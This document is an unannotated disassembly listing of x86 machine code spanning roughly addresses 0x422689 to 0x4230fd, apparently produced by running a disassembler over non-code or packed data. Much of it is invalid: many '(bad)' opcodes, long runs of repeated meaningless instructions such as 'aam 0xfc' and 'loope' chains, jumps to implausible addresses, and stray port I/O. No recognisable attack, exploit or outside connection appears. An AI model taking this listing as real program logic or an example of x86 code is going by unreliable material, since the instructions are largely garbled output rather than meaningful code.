  422689:	test   DWORD PTR [esi-0x4972031d],esi
  42268f:	jecxz  0x42268d
  422691:	add    BYTE PTR [edi-0x2e],ch
  422694:	cld    
  422695:	call   DWORD PTR [ebx-0x7c00032e]
  42269b:	sar    ah,cl
  42269d:	call   DWORD PTR [ecx-0x6e00032e]
  4226a3:	sar    ah,cl
  4226a5:	(bad)  
  4226a6:	jns    0x42267a
  4226a8:	cld    
  4226a9:	inc    DWORD PTR [eax]
	...
  4226d3:	add    ch,dl
  4226d5:	sar    esp,1
  4226d7:	dec    ebp
  4226d9:	sar    esp,1
  4226db:	inc    ebx
  4226dd:	aam    0xfc
  4226df:	dec    DWORD PTR [ebx-0x2c]
  4226e2:	cld    
  4226e3:	inc    DWORD PTR [ebx+0x6ffffcd4]
  4226e9:	aam    0xfc
  4226eb:	call   DWORD PTR [ecx]
  4226ed:	aad    0xfc
  4226ef:	call   DWORD PTR [ecx]
  4226f1:	aad    0xfc
  4226f3:	(bad)  
  4226f4:	stc    
  4226f5:	aam    0xfc
  4226f7:	push   ebx
  4226f9:	aam    0xfc
  4226fb:	push   DWORD PTR [ebx-0x6200032c]
  422701:	aam    0xfc
  422703:	call   edi
  422705:	pop    esi
  422706:	add    BYTE PTR [eax],al
  422708:	pop    ecx
  422709:	aad    0xfc
  42270b:	inc    ecx
  42270d:	aam    0xfc
  42270f:	jmp    FWORD PTR [ecx-0x6600032c]
  422715:	aam    0xfc
  422717:	dec    DWORD PTR [ecx-0x7200032c]
  42271d:	aam    0xfc
  42271f:	jmp    DWORD PTR [edi-0x64ffffa2]
  422725:	aad    0xfc
  422727:	call   DWORD PTR [edi+0x4300005e]
  42272d:	(bad)  
  42272e:	cld    
  42272f:	inc    DWORD PTR [ebx+0x3efffcd5]
  422735:	xor    al,0x89
  422737:	inc    DWORD PTR [eax]
	...
  422761:	add    BYTE PTR [ecx+0x79ff8942],al
  422767:	cmp    BYTE PTR [ecx-0x76af8e01],cl
  42276d:	jmp    FWORD PTR [ecx-0x18]
  422770:	mov    edi,edi
  422772:	popa   
  422773:	or     BYTE PTR [edx-0x7625a601],0xff
  42277a:	push   ecx
  42277b:	enter  0xff89,0x49
  42277f:	xor    BYTE PTR [edx+0xf441ff],cl
  422785:	add    BYTE PTR [esi],bh
  422787:	xchg   esi,eax
  422788:	mov    bh,bh
  42278a:	xor    esp,esi
  42278c:	add    BYTE PTR [eax],al
  42278e:	sub    cl,BYTE PTR ds:[edx-0x76f9de01]
  422795:	call   FWORD PTR [ecx]
  422797:	hlt    
  422798:	add    BYTE PTR [eax],al
  42279a:	or     BYTE PTR ds:[ecx-0x774bf601],cl
  4227a1:	inc    DWORD PTR [ecx]
  4227a3:	ror    BYTE PTR [eax-0x77440601],0xff
  4227aa:	icebp  
  4227ab:	aad    0x88
  4227ad:	(bad)  
  4227ae:	jmp    0xe241b08c
  4227b3:	repz add BYTE PTR [eax],al
  4227b6:	ds jb  0x422745
  4227b9:	call   ecx
  4227bb:	gs mov edi,?
  4227be:	leave  
  4227bf:	aad    0x8b
  4227c1:	inc    ecx
  4227c3:	pop    edi
  4227c4:	mov    edi,?
	...
  4227ee:	add    BYTE PTR [eax],al
  4227f0:	mov    ecx,0xb1ff8c61
  4227f5:	mov    bh,0x8b
  4227f7:	jmp    FWORD PTR [ecx-0x5e007449]
  4227fd:	leave  
  4227fe:	mov    edi,edi
  422800:	cdq    
  422801:	pop    edx
  422802:	lds    ecx,FWORD PTR [ecx+edx*4-0x7673751f]
  422809:	loope  0x4227f1
  42280b:	add    edi,DWORD PTR [esi]
  42280d:	pop    ebx
  42280e:	in     eax,0x8a
  422810:	jns    0x4227f3
  422812:	loopne 0x42279e
  422814:	jno    0x4227f7
  422816:	out    0x3,al
  422818:	ds pop ebx
  42281a:	xchg   DWORD PTR [esi-0x79831e9f],eax
  422820:	pop    ecx
  422821:	loope  0x422883
  422823:	xchg   BYTE PTR [ecx-0x1f],dl
  422826:	out    dx,al
  422827:	test   BYTE PTR [ecx-0x1f],cl
  42282a:	cli    
  42282b:	test   BYTE PTR [ecx-0x1f],al
  42282e:	push   es
  42282f:	test   DWORD PTR [ecx],edi
  422831:	loope  0x422847
  422833:	test   DWORD PTR [ecx],esi
  422835:	loope  0x422833
  422837:	test   BYTE PTR [ecx],ch
  422839:	loope  0x4227db
  42283b:	test   BYTE PTR [ecx],ah
  42283d:	loope  0x4227cd
  42283f:	test   BYTE PTR [ecx],bl
  422841:	loope  0x4227cd
  422843:	test   BYTE PTR [ecx],dl
  422845:	loope  0x4227dd
  422847:	test   BYTE PTR [ecx],cl
  422849:	loope  0x4228b7
  42284b:	test   DWORD PTR [ecx],eax
  42284d:	loope  0x422897
  42284f:	test   ecx,edi
  422851:	loopne 0x422889
  422853:	test   DWORD PTR [eax],eax
	...
  42287d:	add    cl,dh
  42287f:	loopne 0x4228a5
  422881:	test   ecx,ebp
  422883:	loopne 0x4228a1
  422885:	test   ecx,esp
  422887:	loopne 0x422887
  422889:	test   cl,bl
  42288b:	loopne 0x42286b
  42288d:	test   cl,dl
  42288f:	loopne 0x422881
  422891:	xchg   ecx,ecx
  422893:	loopne 0x422885
  422895:	xchg   ecx,eax
  422897:	loopne 0x422895
  422899:	xchg   DWORD PTR [ecx-0x4e77fd20],edi
  42289f:	loopne 0x4228b7
  4228a1:	mov    BYTE PTR [ecx-0x49b10020],ch
  4228a7:	loopne 0x4228a5
  4228a9:	aaa    
  4228aa:	(bad)  
  4228ab:	loopne 0x4228a9
  4228ad:	imul   edi,DWORD PTR [ecx-0x3e800320],0xffffffe0
  4228b4:	cld    
  4228b5:	pop    ecx
  4228b6:	mov    ecx,0xc14ffce0
  4228bb:	loopne 0x4228b9
  4228bd:	mov    bh,0xb9
  4228bf:	loopne 0x4228bd
  4228c1:	mov    ecx,eax
  4228c3:	loopne 0x4228c1
  4228c5:	test   DWORD PTR [ecx-0x3e920320],edi
  4228cb:	loopne 0x4228c9
  4228cd:	icebp  
  4228ce:	mov    eax,0xc0fdfce0
  4228d3:	loopne 0x4228d1
  4228d5:	add    eax,0xffce0b9
  4228da:	rcr    edi,0xfc
  4228dd:	mov    bh,0xb8
  4228df:	(bad)  
  4228e1:	mov    DWORD PTR [eax],0x0
	...
  42290b:	add    al,al
  42290d:	(bad)  
  42290f:	imul   edi,DWORD PTR [eax-0x3fac0321],0xffffffdf
  422916:	cld    
  422917:	gs mov eax,0xc035fcdf
  42291d:	(bad)  
  42291f:	add    eax,0x11fcdfb8
  422924:	rcr    bh,0xfc
  422927:	test   edi,0xb7dffcdf
  42292d:	(bad)  
  42292f:	iret   
  422930:	mov    bh,0xdf
  422932:	cld    
  422933:	lods   eax,DWORD PTR ds:[esi]
  422934:	(bad)  
  422935:	(bad)  
  422937:	xor    eax,0x43fcdfb8
  42293c:	rcr    bh,0xfc
  42293f:	jmp    0x67428481
  422944:	rcr    bh,0xfc
  422947:	add    BYTE PTR [ecx],bl
  422949:	frndint 
  42294b:	push   DWORD PTR [ecx]
  42294d:	frndint 
  42294f:	call   ecx
  422951:	fdivr  st,st(4)
  422953:	push   DWORD PTR [ecx-0x52000328]
  422959:	fdivr  st,st(4)
  42295b:	call   DWORD PTR [edi-0x6cffffa5]
  422961:	fdivr  st,st(4)
  422963:	jmp    DWORD PTR [edi+0x5b]
  422966:	add    BYTE PTR [eax],al
  422968:	pop    ebx
  422969:	fdivr  st,st(4)
  42296b:	(bad)  
  42296c:	jnp    0x422946
  42296e:	cld    
  42296f:	inc    DWORD PTR [eax]
	...
  422999:	add    BYTE PTR [edi],dl
  42299b:	fdivr  st,st(4)
  42299d:	(bad)  
  42299e:	cmp    eax,ebx
  4229a0:	cld    
  4229a1:	(bad)  
  4229a2:	jnp    0x42297c
  4229a4:	cld    
  4229a5:	(bad)  
  4229a6:	jnp    0x422980
  4229a8:	cld    
  4229a9:	jmp    FWORD PTR [ebx-0x28]
  4229ac:	cld    
  4229ad:	call   FWORD PTR [ecx-0x6600032a]
  4229b3:	(bad)  
  4229b4:	cld    
  4229b5:	push   DWORD PTR [ebx+0x53fffcd6]
  4229bb:	(bad)  
  4229bc:	cld    
  4229bd:	jmp    DWORD PTR [edi]
  4229bf:	pop    ebx
  4229c0:	add    BYTE PTR [eax],al
  4229c2:	inc    ebp
  4229c3:	(bad)  
  4229c4:	cld    
  4229c5:	call   DWORD PTR [edi]
  4229c7:	pop    ebx
  4229c8:	add    BYTE PTR [eax],al
  4229ca:	sub    esi,edx
  4229cc:	cld    
  4229cd:	push   ebp
  4229cf:	sar    ah,cl
  4229d1:	jmp    edi
  4229d3:	pop    edx
  4229d4:	add    BYTE PTR [eax],al
  4229d6:	mov    bl,0xd2
  4229d8:	cld    
  4229d9:	call   DWORD PTR [edi-0x4400032e]
  4229df:	sar    ah,cl
  4229e1:	(bad)  
  4229e2:	jg     0x4229b3
  4229e4:	cld    
  4229e5:	push   DWORD PTR [ebp-0x31]
  4229e8:	cld    
  4229e9:	(bad)  
  4229ea:	ds xchg esi,eax
  4229ec:	mov    edi,?
  4229ee:	mov    ecx,0x3e0000f4
  4229f3:	outs   dx,BYTE PTR ds:[esi]
  4229f4:	mov    edi,edi
  4229f6:	test   eax,0xa1ff8982
  4229fb:	ror    BYTE PTR [eax+0xff],cl
	...
  422a25:	add    BYTE PTR [eax],al
  422a27:	add    BYTE PTR [ecx-0x6e0076a0],bl
  422a2d:	jle    0x4229b8
  422a2f:	dec    DWORD PTR [ecx-0x7e007748]
  422a35:	mov    eax,0xa679ff88
  422a3a:	mov    bh,bh
  422a3c:	jno    0x4229f4
  422a3e:	mov    bh,bh
  422a40:	imul   edx,eax,0xf461ff88
  422a46:	add    BYTE PTR [eax],al
  422a48:	test   BYTE PTR ds:[ebx-0x74a5ae01],0xff
  422a50:	dec    ecx
  422a51:	hlt    
  422a52:	add    BYTE PTR [eax],al
  422a54:	ds inc edi
  422a56:	add    al,0x41
  422a58:	lods   al,BYTE PTR ds:[esi]
  422a59:	pop    ss
  422a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a5b:	jae    0x4229f8
  422a5d:	scas   al,BYTE PTR es:[edi]
  422a5e:	stos   DWORD PTR es:[edi],eax
  422a5f:	imul   esp,DWORD PTR [ebx+0x3c3f00b3],0xffffffc2
  422a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a67:	pop    esi
  422a68:	mov    ds:0x9b6babb6,al
  422a6d:	hlt    
  422a6e:	add    BYTE PTR [ecx],ah
  422a70:	ds mov cl,0xac
  422a73:	ins    BYTE PTR es:[edi],dx
  422a74:	(bad)  
  422a75:	iret   
  422a76:	enter  0x685e,0xd8
  422a7a:	lods   al,BYTE PTR ds:[esi]
  422a7b:	bound  edi,QWORD PTR [esi]
  422a7d:	pop    ecx
  422a7e:	call   DWORD PTR [esp+ebp*2-0x35]
  422a82:	mov    ah,0x62
  422a84:	js     0x422a61
  422a86:	lods   al,BYTE PTR ds:[esi]
  422a87:	bound  edi,QWORD PTR [esi]
  422a89:	lar    ebp,WORD PTR [eax+eax*1+0x0]
	...
  422ab6:	dec    ebp
  422ab7:	pop    ebx
  422ab8:	pop    ebx
  422ab9:	mov    dl,0x55
  422abb:	js     0x422b0a
  422abd:	ret    
  422abe:	rcr    ebp,0x96
  422ac1:	add    eax,DWORD PTR [ebx]
  422ac3:	outs   dx,DWORD PTR ds:[esi]
  422ac4:	mov    ds:0xad336f10,al
  422aca:	push   ds
  422acb:	jb     0x422ab4
  422acd:	add    ebp,ebx
  422acf:	pop    ebx
  422ad0:	cs mov al,0x2a
  422ad3:	jns    0x422b1d
  422ad5:	mov    al,0xec
  422ad7:	ins    BYTE PTR es:[edi],dx
  422ad8:	adc    ebp,DWORD PTR [ebp+0x3e7721e]
  422ade:	mov    bl,BYTE PTR [ebx+0x23]
  422ae1:	lods   eax,DWORD PTR ds:[esi]
  422ae2:	fidivr WORD PTR [ebx-0x5]
  422ae5:	(bad)
  422ae8:	or     al,0x4
  422aea:	outs   dx,BYTE PTR ds:[esi]
  422aeb:	pop    ebx
  422aec:	sub    ebp,DWORD PTR [ebp-0x3cfc8422]
  422af2:	in     eax,0x6e
  422af4:	(bad)  
  422af5:	mov    al,ds:0xffdd51
  422afa:	fisubr DWORD PTR [ecx-0x2d]
  422afd:	mov    cl,0xde
  422aff:	push   0xffffffd0
  422b01:	ret    0xdd39
  422b04:	stc    
  422b05:	add    BYTE PTR [edx-0x614e4498],ah
  422b0b:	jp     0x422ac0
  422b0d:	ret    0xdd21
  422b10:	fld    QWORD PTR [edx]
  422b12:	xor    DWORD PTR [esi-0x4d],0xffffffc5
  422b16:	cwde   
  422b17:	outs   dx,DWORD PTR ds:[esi]
  422b18:	mov    edx,es
	...
  422b42:	add    BYTE PTR [eax],al
  422b44:	lea    esp,[edi-0x67]
  422b47:	stos   BYTE PTR es:[edi],al
  422b48:	lahf   
  422b49:	data16 fwait
  422b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b4c:	outs   dx,BYTE PTR ds:[esi]
  422b4d:	call   0xbbac:0x5bd503e7
  422b54:	pop    ecx
  422b55:	jp     0x422ae4
  422b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b58:	jl     0x422bc7
  422b5a:	add    BYTE PTR [edi-0x5c],bh
  422b5d:	push   0x6d
  422b5f:	jg     0x422b01
  422b61:	jns    0x422bd1
  422b63:	pop    ebp
  422b64:	out    dx,eax
  422b65:	push   0x77905072
  422b6a:	jno    0x422b94
  422b6c:	inc    edx
  422b6d:	aas    
  422b6e:	jmp    DWORD PTR ds:0x504668d9
  422b74:	out    dx,al
  422b75:	jns    0x422bc8
  422b77:	push   eax
  422b78:	in     al,0x79
  422b7a:	add    bh,dh
  422b7c:	cmp    eax,0xdd44729a
  422b81:	push   0x70d52f63
  422b86:	arpl   WORD PTR [ebx*8-0x57ff8f94],bp
  422b8d:	ja     0x422bce
  422b8f:	jmp    0x344486d1
  422b94:	popf   
  422b95:	ins    BYTE PTR es:[edi],dx
  422b96:	push   esi
  422b97:	adc    BYTE PTR [ecx-0x7ff0b299],bl
  422b9d:	jne    0x422c0b
  422b9f:	add    al,0x3a
  422ba1:	or     al,BYTE PTR [edx]
  422ba3:	mov    esp,0xd95f719b
	...
  422bd0:	add    BYTE PTR [eax],al
  422bd2:	imul   esi,DWORD PTR [ebp+0x63],0xffffffde
  422bd6:	or     dh,BYTE PTR [esi+0x46]
  422bd9:	shl    cl,0x78
  422bdc:	add    BYTE PTR [ebx+0x3c],dl
  422bdf:	(bad)  
  422be0:	ins    DWORD PTR es:[edi],dx
  422be1:	enter  0x8fd9,0x67
  422be5:	retf   
  422be6:	iret   
  422be7:	jl     0x422c5b
  422be9:	mov    al,0xfc
  422beb:	(bad)  
  422bed:	mov    edx,0x9563963c
  422bf2:	in     eax,dx
  422bf3:	imul   ebp,DWORD PTR [ebp-0x76],0x9b6477fc
  422bfa:	cwde   
  422bfb:	push   0x71
  422bfd:	add    bh,dl
  422bff:	push   edi
  422c00:	test   BYTE PTR [ecx],al
  422c02:	cwde   
  422c03:	mov    ah,0x70
  422c05:	push   esp
  422c06:	retf   0x6cac
  422c09:	push   eax
  422c0a:	(bad)  
  422c0b:	mov    ds:0x57d74164,eax
  422c10:	xor    DWORD PTR [eax],eax
  422c12:	adc    al,0xa5
  422c14:	popa   
  422c15:	popa   
  422c16:	sbb    edi,DWORD PTR [edx-0x45ea96c0]
  422c1c:	pop    edi
  422c1d:	je     0x422c2f
  422c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c20:	jne    0x422c63
  422c22:	xchg   edi,eax
  422c23:	push   edi
  422c24:	add    BYTE PTR gs:[ebx-0x46],ch
  422c28:	push   0x42ba4b65
  422c2d:	imul   esi,DWORD PTR [ebx],0x97003dba
  422c33:	push   esi
  422c34:	inc    ebx
  422c35:	add    BYTE PTR gs:[eax],al
	...
  422c60:	pop    ebx
  422c61:	adc    al,0x72
  422c63:	jb     0x422cba
  422c65:	mov    edx,0xa547746a
  422c6a:	imul   esp,DWORD PTR [ebx+0x3a],0xffffffa4
  422c6e:	outs   dx,DWORD PTR ds:[esi]
  422c6f:	add    bh,dl
  422c71:	push   esp
  422c72:	push   ebx
  422c73:	imul   edi,DWORD PTR [ebx],0x76683fba
  422c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c7a:	push   eax
  422c7b:	outs   dx,DWORD PTR ds:[esi]
  422c7c:	xchg   edx,eax
  422c7d:	stos   BYTE PTR es:[edi],al
  422c7e:	push   0x75a0fe74
  422c83:	je     0x422c7f
  422c85:	pop    esi
  422c86:	sub    BYTE PTR [ecx],al
  422c88:	fdivr  st,st(3)
  422c8a:	jo     0x422cd8
  422c8c:	not    BYTE PTR [ecx]
  422c8e:	jno    0x422cd5
  422c90:	aad    0x10
  422c92:	ins    BYTE PTR es:[edi],dx
  422c93:	jb     0x422cbc
  422c95:	pop    edi
  422c96:	adc    DWORD PTR [ebx],eax
  422c98:	mov    bl,0x11
  422c9a:	jno    0x422d0e
  422c9c:	mov    ah,0x3
  422c9e:	ins    DWORD PTR es:[edi],dx
  422c9f:	inc    ecx
  422ca0:	les    eax,FWORD PTR ds:[eax]
  422ca3:	push   edi
  422ca4:	ds add eax,0x585f62b3
  422caa:	mov    al,ds:0xa4e95153
  422caf:	addr16 arpl ax,sp
  422cb2:	mov    al,0x30
  422cb4:	or     al,0xf5
  422cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cb7:	pop    esi
  422cb8:	dec    esi
  422cb9:	xor    eax,0xc44a6cac
  422cbe:	add    BYTE PTR [ebx],ah
  422cc0:	cmp    al,0x94
  422cc2:	mov    dh,0x6c
	...
  422cec:	add    BYTE PTR [eax],al
  422cee:	sbb    eax,0x6d70b51f
  422cf3:	(bad)  
  422cf4:	mov    esi,0xb0952c66
  422cf9:	call   FWORD PTR [ecx+0xe4d02ac]
  422cff:	pop    ds
  422d00:	stos   BYTE PTR es:[edi],al
  422d01:	dec    edi
  422d02:	or     al,0x71
  422d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d05:	bound  ecx,QWORD PTR ds:0x3c250475
  422d0b:	xchg   esp,eax
  422d0c:	mov    dh,0x6c
  422d0e:	fstp   QWORD PTR [esi-0x4b]
  422d11:	jo     0x422d40
  422d13:	push   ss
  422d14:	(bad)  
  422d15:	(bad)  
  422d16:	out    0xcf,al
  422d18:	add    BYTE PTR [edi+0x6dab8a3e],ch
  422d1e:	fiadd  DWORD PTR [ecx-0x48328e55]
  422d24:	mov    esi,0xc39ed266
  422d29:	(bad)  
  422d2a:	cmp    ecx,ebx
  422d2c:	add    eax,0xb2b0ad6c
  422d31:	pusha  
  422d32:	fwait
  422d33:	adc    al,0xac
  422d35:	ds fiadd WORD PTR ds:[eax]
  422d39:	inc    esi
  422d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d3b:	mov    ds:0xc9b4d9c,al
  422d40:	lods   eax,DWORD PTR ds:[esi]
  422d41:	inc    ebp
  422d42:	xchg   edi,eax
  422d43:	pop    ebx
  422d44:	xchg   ebx,eax
  422d45:	mov    al,ds:0x34c5b40
  422d4a:	add    BYTE PTR [ebp+eax*4-0x61],0x7e
  422d4f:	inc    edi
  422d50:	jle    0x422d08
	...
  422d7a:	add    BYTE PTR [eax],al
  422d7c:	pop    esp
  422d7d:	pop    ebx
  422d7e:	mov    ebx,0x73407b04
  422d83:	enter  0x3f6a,0x7c
  422d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d88:	pop    esp
  422d89:	and    ecx,DWORD PTR [eax+0x4c475da9]
  422d8f:	ret    
  422d90:	rcr    ecx,0x74
  422d93:	add    eax,DWORD PTR [ebx]
  422d95:	inc    eax
  422d96:	pop    ebx
  422d97:	rcr    BYTE PTR [ecx*2+0x491aab5a],cl
  422d9e:	sub    al,0xbc
  422da0:	pusha  
  422da1:	pop    ebx
  422da2:	adc    DWORD PTR [ebx],eax
  422da4:	add    eax,DWORD PTR [eax+0x3b]
  422da7:	enter  0x3e22,0x48
  422dab:	test   al,0x1c
  422dad:	and    al,0x15
  422daf:	mov    ds:0x3e71c12,al
  422db4:	repnz pop ebx
  422db6:	cs lahf 
  422db8:	in     eax,dx
  422db9:	sub    eax,0x3fedb510
  422dbe:	adc    al,0xcb
  422dc0:	rol    DWORD PTR [eax+0xe],cl
  422dc3:	add    al,0x9e
  422dc5:	pop    ebx
  422dc6:	cs lahf 
  422dc8:	int    0x31
  422dca:	add    BYTE PTR [edx-0x4b21b623],ch
  422dd0:	std    
  422dd1:	inc    ebx
  422dd2:	fstp   DWORD PTR [esi-0x4a39b062]
  422dd8:	test   al,0x1a
  422dda:	out    0x3,eax
  422ddc:	jnp    0x422e38
  422dde:	scas   al,BYTE PTR es:[edi]
  422ddf:	sahf   
	...
  422e08:	add    BYTE PTR [eax],al
  422e0a:	lods   eax,DWORD PTR ds:[esi]
  422e0b:	sub    edi,DWORD PTR [ecx+0x3a93aa]
  422e11:	mov    ebp,0xbe7228b0
  422e16:	fild   WORD PTR [ecx+0x6c]
  422e19:	mov    edx,gs
  422e1b:	dec    esp
  422e1c:	jb     0x422dae
  422e1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e1f:	aas    
  422e20:	aas    
  422e21:	jmp    0xba448363
  422e26:	enter  0x414c,0x7c
  422e2a:	stos   DWORD PTR es:[edi],eax
  422e2b:	dec    edx
  422e2c:	arpl   WORD PTR [edi+0x7b671ca9],cx
  422e32:	mov    al,0x3b
  422e34:	je     0x422eb4
  422e36:	xchg   ebx,eax
  422e37:	push   ecx
  422e38:	aas    
  422e39:	jmp    0x2641557b
  422e3e:	(bad)  [eax+edx*2+0x5b]
  422e42:	in     eax,0x4e
  422e44:	pop    edi
  422e45:	push   ebp
  422e46:	leave  
  422e47:	sub    BYTE PTR [edx+0x56],dh
  422e4a:	fadd   QWORD PTR [ecx+0x6c]
  422e4d:	inc    esp
  422e4e:	jae    0x422e8d
  422e50:	popa   
  422e51:	cmp    eax,0x1f6e47e5
  422e56:	fld    QWORD PTR [ebp+0x63]
  422e59:	sbb    bh,BYTE PTR [ebp-0x28]
  422e5c:	cld    
  422e5d:	xor    BYTE PTR ds:0x8a1d631e,bh
  422e63:	dec    edx
  422e64:	addr16 pop ss
  422e66:	popf   
  422e67:	dec    esp
  422e68:	arpl   WORD PTR [ecx],bx
  422e6a:	test   al,0x47
  422e6c:	data16 adc BYTE PTR [eax],al
	...
  422e97:	add    BYTE PTR [esi-0x71f8b8c3],ah
  422e9d:	cdq    
  422e9e:	add    BYTE PTR [edi+0x3d],ch
  422ea1:	push   ds
  422ea2:	arpl   bp,bx
  422ea4:	jp     0x422ef3
  422ea6:	jb     0x422e83
  422ea8:	fadd   DWORD PTR [ebp+0x74]
  422eab:	lods   eax,DWORD PTR ds:[esi]
  422eac:	in     al,0x49
  422eae:	arpl   dx,cx
  422eb0:	fld    DWORD PTR [esi+0x72]
  422eb3:	add    dh,bh
  422eb5:	pushf  
  422eb6:	cld    
  422eb7:	(bad)  
  422eb8:	stc    
  422eb9:	pop    esi
  422eba:	ins    BYTE PTR es:[edi],dx
  422ebb:	jae    0x422e90
  422ebd:	or     eax,0xaac96569
  422ec2:	cld    
  422ec3:	dec    DWORD PTR [edx]
  422ec5:	pop    esi
  422ec6:	dec    ecx
  422ec7:	jne    0x422e94
  422ec9:	pop    es
  422eca:	inc    dx
  422ecc:	into   
  422ecd:	pop    es
  422ece:	bound  edx,QWORD PTR [eax+ebp*2-0x55]
  422ed2:	gs fs mov dl,0x9e
  422ed6:	fs popa 
  422ed8:	push   ebp
  422ed9:	pop    esp
  422eda:	mov    DWORD PTR [ecx],eax
  422edc:	mov    al,ds:0xbe5470f8
  422ee1:	(bad)  
  422ee2:	addr16 inc ebx
  422ee4:	push   0xa7746b0a
  422ee9:	pop    ebx
  422eea:	mov    bh,0x2
  422eec:	je     0x422ef1
  422eee:	bound  esp,QWORD PTR [ebp+0x7]
  422ef1:	pop    edi
  422ef2:	xor    al,BYTE PTR [ecx]
  422ef4:	push   eax
  422ef5:	cli    
  422ef6:	jo     0x422f45
  422ef8:	or     bl,bh
  422efa:	jno    0x422f68
	...
  422f24:	add    BYTE PTR [eax],al
  422f26:	add    bl,BYTE PTR [ecx]
  422f28:	data16 ins BYTE PTR es:[edi],dx
  422f2a:	add    ah,BYTE PTR [ecx-0x61cd92a3]
  422f30:	cld    
  422f31:	inc    eax
  422f33:	pop    ebp
  422f34:	dec    esp
  422f35:	inc    ebx
  422f36:	sbb    bh,dh
  422f38:	ins    BYTE PTR es:[edi],dx
  422f39:	push   ebx
  422f3a:	push   ebx
  422f3b:	or     eax,0x9e306e66
  422f40:	cld    
  422f41:	(bad)  
  422f42:	fcomp  QWORD PTR [esi+0x41]
  422f45:	js     0x422f85
  422f47:	or     ecx,DWORD PTR [ebp+0x72]
  422f4a:	dec    eax
  422f4b:	cld    
  422f4c:	popa   
  422f4d:	jae    0x422fb3
  422f4f:	pop    ebx
  422f50:	lods   eax,DWORD PTR ds:[esi]
  422f51:	add    dh,ah
  422f53:	sti    
  422f54:	jo     0x422fab
  422f56:	ds sahf 
  422f58:	test   al,0x5e
  422f5a:	cwde   
  422f5b:	mov    al,ds:0x79a62a4
  422f60:	mov    ecx,0xad14a360
  422f65:	mov    ax,ds:0x9a66ba9e
  422f6b:	adc    BYTE PTR [eax-0x6016c18f],ah
  422f71:	jno    0x422fdb
  422f73:	fbld   TBYTE PTR [eax+esi*1+0x6b9c9e2c]
  422f7a:	pop    edx
  422f7b:	les    eax,FWORD PTR [eax]
  422f7d:	mov    DWORD PTR [esi],edi
  422f7f:	add    DWORD PTR [edi-0x5fafa09e],ebp
  422f85:	push   eax
  422f86:	dec    edx
  422f87:	push   edx
  422f88:	mov    al,ds:0x5e
	...
  422fb1:	add    BYTE PTR [eax],al
  422fb3:	add    BYTE PTR [ebx-0xb],bl
  422fb6:	mov    ds:0xa5307947,al
  422fbb:	popa   
  422fbc:	pop    ds
  422fbd:	sub    BYTE PTR [edx*4+0x739f853e],al
  422fc4:	idiv   BYTE PTR [eax+ebp*4+0x6c]
  422fc8:	sbb    al,0x23
  422fca:	test   al,0x45
  422fcc:	or     al,0x25
  422fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fcf:	push   eax
  422fd0:	or     dl,BYTE PTR [edx-0x3be4a161]
  422fd6:	add    BYTE PTR [esi],cl
  422fd8:	and    DWORD PTR ds:[ebp-0x5ca113c0],0xaf84db73
  422fe3:	data16 loop 0x422fa9
  422fe6:	add    BYTE PTR [eax+0x3e],ah
  422fe9:	and    DWORD PTR [ebp-0x562f20ad],0xbe5edb4a
  422ff3:	jno    0x422fd8
  422ff5:	pop    esi
  422ff6:	add    al,0xd
  422ff8:	ds pop ebx
  422ffa:	stos   BYTE PTR es:[edi],al
  422ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ffc:	jle    0x423047
  422ffe:	les    esp,FWORD PTR [ebp+ebp*4-0x515a5fc0]
  423005:	dec    edi
  423006:	enter  0x9ea5,0x40
  42300a:	out    0x3,eax
  42300c:	cvtdq2ps xmm5,XMMWORD PTR [esi-0x3adb6359]
  423013:	lods   al,BYTE PTR ds:[esi]
  423014:	lea    eax,[eax+ecx*8-0x59]
	...
  423040:	add    BYTE PTR [eax],al
  423042:	cwde   
  423043:	push   ecx
  423044:	mov    WORD PTR [ebx],es
  423046:	imul   eax,DWORD PTR [edi-0x7c],0xfffffff2
  42304a:	das    
  42304b:	test   DWORD PTR [ebx-0x73a4aa59],ecx
  423051:	add    DWORD PTR [ebx+0x4a],ebp
  423054:	ja     0x423007
  423056:	pusha  
  423057:	inc    ebp
  423058:	jae    0x422ff7
  42305a:	adc    BYTE PTR [ebx+0x7c],bl
  42305d:	mov    dl,0x5c
  42305f:	dec    ecx
  423060:	mov    edx,0x533f13f1
  423065:	test   al,0xb9
  423067:	aad    0xb6
  423069:	add    ecx,DWORD PTR [eax+eax*2]
  42306c:	dec    esi
  42306d:	lds    ebx,FWORD PTR [ecx]
  42306f:	inc    eax
  423070:	cmp    eax,0x2c541cc9
  423075:	mov    esp,0x3a15b58
  42307a:	in     al,dx
  42307b:	aas    
  42307c:	dec    esi
  42307d:	ror    DWORD PTR [eax+eax*2],cl
  423080:	cmp    DWORD PTR [ebx-0x50ecc415],edi
  423086:	fcomp  QWORD PTR [edi]
  423088:	pop    ds
  423089:	ret    
  42308a:	jno    0x423061
  42308c:	pop    ebp
  42308d:	add    ecx,DWORD PTR [eax+eax*2]
  423090:	push   es
  423091:	rcl    ebp,0x45
  423094:	cli    
  423095:	sahf   
  423096:	push   es
  423097:	inc    eax
  423098:	add    BYTE PTR [ebx+eax*4],al
  42309b:	pop    ebx
  42309c:	add    BYTE PTR [ebx],bl
  42309e:	test   eax,0xa0f94d3e
  4230a3:	inc    edi
  4230a4:	dec    ecx
  4230a5:	int3   
	...
  4230ce:	add    BYTE PTR [eax],al
  4230d0:	hlt    
  4230d1:	xchg   ebp,eax
  4230d2:	add    BYTE PTR ds:0xce63293d,ah
  4230d8:	call   0xf6fea423
  4230dd:	cmp    DWORD PTR [edi-0x54],esi
  4230e0:	aad    0x95
  4230e2:	add    BYTE PTR [ebx-0x319cd6c3],al
  4230e8:	dec    BYTE PTR [edx+0x63]
  4230eb:	enter  0x39d1,0x49
  4230ef:	mov    WORD PTR [ebp+edx*4+0x293d0600],?
  4230f6:	arpl   WORD PTR [esi-0x488bc5f2],cx
  4230fc:	pushf  
  4230fd:	inc    eax
